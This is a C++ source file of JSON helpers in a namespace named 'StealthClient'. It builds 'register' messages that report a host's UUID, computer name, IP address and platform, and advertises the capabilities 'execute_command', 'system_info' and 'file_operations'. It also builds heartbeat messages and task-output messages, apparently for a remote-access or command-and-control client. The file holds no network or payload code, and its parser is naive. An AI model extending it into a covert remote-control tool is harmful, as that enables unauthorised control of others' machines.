#include "json_utils.h"
#include <sstream>
#include <algorithm>
#include <cctype>

namespace StealthClient {

std::string JsonUtils::ToString(const JsonObject& obj) {
    std::ostringstream oss;
    oss << "{";
    
    bool first = true;
    
    // Add string fields
    for (const auto& pair : obj.strings) {
        if (!first) oss << ",";
        oss << "\"" << pair.first << "\":\"" << EscapeString(pair.second) << "\"";
        first = false;
    }
    
    // Add integer fields
    for (const auto& pair : obj.integers) {
        if (!first) oss << ",";
        oss << "\"" << pair.first << "\":" << pair.second;
        first = false;
    }
    
    // Add boolean fields
    for (const auto& pair : obj.booleans) {
        if (!first) oss << ",";
        oss << "\"" << pair.first << "\":" << (pair.second ? "true" : "false");
        first = false;
    }
    
    // Add array fields
    for (const auto& pair : obj.arrays) {
        if (!first) oss << ",";
        oss << "\"" << pair.first << "\":[";
        for (size_t i = 0; i < pair.second.size(); ++i) {
            if (i > 0) oss << ",";
            oss << "\"" << EscapeString(pair.second[i]) << "\"";
        }
        oss << "]";
        first = false;
    }
    
    oss << "}";
    return oss.str();
}

JsonUtils::JsonObject JsonUtils::FromString(const std::string& json) {
    JsonObject obj;
    std::string trimmed = Trim(json);
    
    if (trimmed.empty() || trimmed[0] != '{' || trimmed.back() != '}') {
        return obj; // Invalid JSON
    }
    
    // Simple parsing - remove outer braces
    trimmed = trimmed.substr(1, trimmed.length() - 2);
    
    // Split by commas (this is very basic)
    std::istringstream iss(trimmed);
    std::string token;
    
    while (std::getline(iss, token, ',')) {
        size_t colonPos = token.find(':');
        if (colonPos != std::string::npos) {
            std::string key = Trim(token.substr(0, colonPos));
            std::string value = Trim(token.substr(colonPos + 1));
            
            // Remove quotes from key
            if (key.length() >= 2 && key[0] == '"' && key.back() == '"') {
                key = key.substr(1, key.length() - 2);
            }
            
            // Parse value
            if (value.length() >= 2 && value[0] == '"' && value.back() == '"') {
                // String value
                value = value.substr(1, value.length() - 2);
                obj.strings[key] = UnescapeString(value);
            } else if (value == "true") {
                obj.booleans[key] = true;
            } else if (value == "false") {
                obj.booleans[key] = false;
            } else if (std::all_of(value.begin(), value.end(), ::isdigit)) {
                obj.integers[key] = std::stoi(value);
            }
        }
    }
    
    return obj;
}

std::string JsonUtils::CreateRegisterMessage(const std::string& uuid, const std::string& computerName, const std::string& ipAddress, const std::string& platform) {
    JsonObject obj;
    obj.strings["type"] = "register";
    obj.strings["uuid"] = uuid;
    obj.strings["computerName"] = computerName;
    obj.strings["ipAddress"] = ipAddress;
    obj.strings["platform"] = platform;
    obj.strings["capabilities"] = "execute_command,system_info,file_operations";
    return ToString(obj);
}

std::string JsonUtils::CreateHeartbeatMessage(const std::string& uuid) {
    JsonObject obj;
    obj.strings["type"] = "heartbeat";
    obj.strings["uuid"] = uuid;
    return ToString(obj);
}

std::string JsonUtils::CreateOutputMessage(const std::string& taskId, const std::string& output, const std::string& status) {
    JsonObject obj;
    obj.strings["type"] = "output";
    obj.strings["taskId"] = taskId;
    obj.strings["output"] = output;
    obj.strings["status"] = status;
    return ToString(obj);
}

std::string JsonUtils::GetMessageType(const std::string& json) {
    JsonObject obj = FromString(json);
    auto it = obj.strings.find("type");
    return (it != obj.strings.end()) ? it->second : "";
}

std::string JsonUtils::GetStringField(const std::string& json, const std::string& field) {
    JsonObject obj = FromString(json);
    auto it = obj.strings.find(field);
    return (it != obj.strings.end()) ? it->second : "";
}

int JsonUtils::GetIntField(const std::string& json, const std::string& field) {
    JsonObject obj = FromString(json);
    auto it = obj.integers.find(field);
    return (it != obj.integers.end()) ? it->second : 0;
}

bool JsonUtils::GetBoolField(const std::string& json, const std::string& field) {
    JsonObject obj = FromString(json);
    auto it = obj.booleans.find(field);
    return (it != obj.booleans.end()) ? it->second : false;
}

std::string JsonUtils::EscapeString(const std::string& str) {
    std::string result;
    for (char c : str) {
        switch (c) {
            case '"': result += "\\\""; break;
            case '\\': result += "\\\\"; break;
            case '\n': result += "\\n"; break;
            case '\r': result += "\\r"; break;
            case '\t': result += "\\t"; break;
            default: result += c; break;
        }
    }
    return result;
}

std::string JsonUtils::UnescapeString(const std::string& str) {
    std::string result;
    for (size_t i = 0; i < str.length(); ++i) {
        if (str[i] == '\\' && i + 1 < str.length()) {
            switch (str[i + 1]) {
                case '"': result += '"'; i++; break;
                case '\\': result += '\\'; i++; break;
                case 'n': result += '\n'; i++; break;
                case 'r': result += '\r'; i++; break;
                case 't': result += '\t'; i++; break;
                default: result += str[i]; break;
            }
        } else {
            result += str[i];
        }
    }
    return result;
}

std::string JsonUtils::Trim(const std::string& str) {
    size_t start = str.find_first_not_of(" \t\n\r");
    if (start == std::string::npos) return "";
    size_t end = str.find_last_not_of(" \t\n\r");
    return str.substr(start, end - start + 1);
}

} // namespace StealthClient
